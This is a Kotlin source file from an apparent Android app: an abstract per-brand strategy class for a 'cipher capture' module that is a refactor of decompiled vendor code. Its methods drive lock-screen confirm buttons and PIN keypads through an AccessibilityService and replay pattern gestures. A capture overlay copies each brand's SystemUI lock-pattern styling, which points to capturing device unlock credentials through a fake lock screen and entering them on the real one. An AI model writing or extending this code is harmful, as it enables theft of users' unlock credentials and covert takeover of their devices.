package com.storm.safe.rock.service.modules.cipher.vendor

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.res.Resources
import android.graphics.PointF
import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * Abstract base for brand-differentiated cipher capture behavior.
 *
 * Vendor CipherCaptureManager (C0335a1) and PatternCaptureOverlay (C0337a3)
 * contain 18+ brand-specific `when` branches scattered across 6 methods.
 * This Strategy pattern extracts those branches so each brand gets its own
 * implementation file, making per-brand tuning and testing independent.
 *
 * Architecture mirrors yw5xud module's VendorSteps + BrandDetector + StepsFactory.
 */
abstract class CipherBrandStrategy {

    abstract val tag: String

    // ---- CipherCaptureManager brand differences ----

    /**
     * Brand-specific confirm button click. Vendor: clickConfirmButtonFull brand branches.
     * @return true if the brand-specific button was clicked successfully
     */
    open fun clickBrandConfirmButton(
        root: AccessibilityNodeInfo,
        pkg: String,
        basePkg: String,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByIdAndClass: (AccessibilityNodeInfo, String, String) -> AccessibilityNodeInfo?
    ): Boolean = false

    /**
     * Brand-specific PIN keypad input. Vendor: tryKeyNodeInputFull brand branches.
     * @return true if the brand-specific input succeeded
     */
    open fun inputPinViaKeyNodes(
        root: AccessibilityNodeInfo,
        pin: String,
        basePkg: String,
        isSystemUi: Boolean,
        service: AccessibilityService,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByContentDesc: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        clickConfirm: () -> Unit,
        sleep200: () -> Unit,
        sleep500: () -> Unit
    ): Boolean = false

    /**
     * Brand-specific pattern gesture coordinate resolution.
     * Vendor: tryConfirmLock where Vivo uses raw coords vs transform.
     * Default implementation uses coordinate transformation (non-Vivo).
     * @return transformed PointF list for gesture replay, null to skip
     */
    open fun resolvePatternGesturePoints(
        dedupedPoints: java.util.LinkedList<android.graphics.Point>,
        patternNode: AccessibilityNodeInfo,
        boundsInScreen: Rect?,
        boundsInParent: Rect?,
        transformFn: (java.util.LinkedList<android.graphics.Point>, Rect, Rect, Rect, Rect) -> List<android.graphics.Point>
    ): ArrayList<PointF>? {
        // Default: use coordinate transformation (non-Vivo)
        if (boundsInScreen == null || boundsInParent == null) return null
        val nodeRect = Rect()
        patternNode.getBoundsInScreen(nodeRect)
        val parentRect = Rect()
        patternNode.getBoundsInParent(parentRect)
        val transformed = transformFn(dedupedPoints, boundsInScreen, boundsInParent, nodeRect, parentRect)
        val result = ArrayList<PointF>()
        for (p in transformed) result.add(PointF(p.x.toFloat(), p.y.toFloat()))
        return result
    }

    /** Brand-specific ConfirmLock detection view IDs. Appended to generic list. */
    open fun extraConfirmLockIds(pkg: String): List<String> = emptyList()

    /** Brand-specific password package names. Appended to VALID_PASSWORD_PACKAGES. */
    open fun extraPasswordPackages(): Set<String> = emptySet()

    // ---- PatternCaptureOverlay brand differences ----

    /** Brand fallback pattern style (when SystemUI resources are unavailable). */
    abstract fun applyPatternFallbackStyle(
        view: PatternLockView,
        themeColor: Int,
        density: Float
    )

    /**
     * Brand-specific SystemUI resource reading. Returns null to fall back to AOSP default.
     */
    open fun readBrandResources(
        res: Resources,
        suiContext: Context,
        density: Float
    ): BrandResourceResult? = null

    /** Brand-specific animation durations (dotAnimationDuration, pathEndAnimationDuration). */
    open fun animationDurations(): Pair<Int, Int> = Pair(150, 100)

    /** Brand pattern aspect ratio. 1 = square (OPPO only), 0 = free ratio. */
    open fun patternAspectRatio(): Int = 0

    /** Brand-specific outer circle alpha resource name. null = none. */
    open fun outerCircleAlphaResourceName(): String? = null
}
